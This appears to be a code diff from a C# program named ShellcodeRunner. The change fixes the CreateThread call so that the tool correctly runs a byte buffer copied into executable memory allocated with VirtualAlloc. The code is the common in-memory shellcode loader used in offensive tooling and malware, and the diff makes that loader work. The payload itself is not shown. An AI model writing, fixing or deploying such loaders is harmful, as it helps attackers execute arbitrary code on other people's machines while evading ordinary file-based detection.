@@ -28,7 +28,7 @@ namespace ShellcodeRunner
 
             IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
             Marshal.Copy(buf, 0, addr, buf.Length);
-            IntPtr hThread = CreateThread(addr, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
             NtWaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
